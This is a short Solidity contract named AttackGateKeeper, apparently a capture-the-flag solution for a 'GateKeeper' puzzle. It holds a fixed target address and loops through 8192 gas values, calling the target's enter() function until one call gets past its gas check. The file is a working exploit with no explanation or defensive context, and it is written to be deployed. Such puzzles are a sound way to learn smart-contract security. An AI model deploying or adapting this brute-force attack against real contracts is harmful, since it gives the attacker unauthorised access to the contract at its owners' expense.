pragma solidity ^0.6.0;

interface IGateKeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGateKeeper {
    IGateKeeper gateKeeper;
    constructor() public {
        gateKeeper = IGateKeeper(0x7963142077118d4C4EDc2cEa145C809bb1A77917);
    }

    function attack(bytes8 key, uint baseGas) public {
        for (uint i =0 ; i<8192; i++){
            try gateKeeper.enter{gas: baseGas+i}(key) {
                return;
            }
            catch {
            }
        }
    }
}